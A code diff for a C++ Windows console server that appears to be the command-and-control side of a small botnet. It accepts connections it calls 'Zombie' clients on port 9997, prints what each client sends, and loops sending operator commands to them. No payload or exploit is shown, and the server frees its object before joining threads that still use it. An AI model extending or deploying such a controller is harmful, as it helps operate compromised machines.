@@ -8,7 +8,7 @@
 #include <Windows.h>
 #include "Animations.h"
 
-void recv_t(Server* serv1)	
+void recv_t_old(Server* serv1)	
 {
 	while (!serv1->getExit())
 	{
@@ -19,7 +19,6 @@ void recv_t(Server* serv1)
 			recv(clients[i].sock, buffer, sizeof(buffer), 0);
 			std::cout << "[*] Client " << clients[i].number << " : " << buffer <<std::endl;
 			
-
 		}
 		Sleep(200);
 	}
@@ -28,15 +27,16 @@ void listen_client(Server* serv1,const unsigned short nb)
 {
 	char buffer[256]={ 0 };
 
-	std::cout << "Dans thread" << std::endl;
+	std::cout << "Dans thread recv : " << nb << std::endl;
+
 	while ( strcmp(buffer,"exit") != 0)
 	{
 		std::vector<st_Client> clients = serv1->getClients();
-		if (recv(clients[nb].sock, buffer, sizeof(buffer), 0) > 0)
-			std::cout << "[*] Zombie " << nb << " : " << buffer << std::endl;
-		else
-			break;
-		Sleep(300);
+			if (recv(clients[nb].sock, buffer, sizeof(buffer), 0) > 0)
+				std::cout << "[*] Zombie " << nb+1 << " : " << buffer << std::endl;
+			else
+				break;
+			Sleep(400);		
 
 	}
 }
@@ -53,7 +53,9 @@ void send_t(Server* serv1)
 	bool val = 1;
 	while (val)
 	{
+		SetColor(8);
 		val = serv1->send_c();
+		SetColor(7);
 	}
 }
 
@@ -61,59 +63,42 @@ int main()
 {
 	const unsigned short port = 9997;
 	std::vector<std::thread> thread_list;
-	//int nb = 0;
+	bool test = 0;
+	int nb = 0;
+
 	SetColor(14);
 	Server* serv1 = new Server(port);
-	//Server serv1(port);
 	SetColor(2);
-	serv1->acceptClient();
-	std::cout << "[*] Starting thread ..." << std::endl;
-	//thread_list.push_back(std::thread(listen_client,serv1,nb));
-	//nb++;
-	//std::thread t_send(send_t, serv1);
 	
-
-	std::thread t_accept(accept_t, serv1);
-	std::thread t_recv(recv_t,serv1);
-	std::cout << std::endl;
+	serv1->acceptClient();
+	thread_list.push_back(std::thread(listen_client, serv1, nb));
+	nb++;
+	
+	std::cout << "[*] Starting thread ..." << std::endl;
+	std::thread t_send(send_t, serv1);
+	
 	std::cout << "[*] Done" << std::endl;
 	Sleep(2000);
 	system("cls");
 	Animations::Welcome();
-
-	bool val = 1;
 	
-	while (val)
+	while (serv1->getError() != 1)
 	{
-		SetColor(4);
-		val = serv1->send_c();
-		SetColor(7);
-		Sleep(500);
-	}
-	bool test = 1;
-	/*
-	bool test = 0;
-	while (serv1.getError() != 1)
-	{
-		test = serv1.acceptClient();
-		//std::thread t_listen(listen_client,serv1,nb);
+		test = serv1->acceptClient();
 		if (test)
 		{
 			thread_list.push_back(std::thread(listen_client, serv1, nb));
 			nb++;
 		}
+		Sleep(500);
 	}
 
-	*/
 	std::cout << "[*] Closing thread ..." << std::endl;
-	//t_send.join();
-	
-	
-	/*for (int i = 0; i < thread_list.size(); i++)
+	delete serv1;
+	t_send.join();
+	for (int i = 0; i < thread_list.size(); i++)
 	{
 		thread_list[i].join();
 	}
-	*/
-	delete serv1;
 	std::cout << "[*] Done" << std::endl;
 }
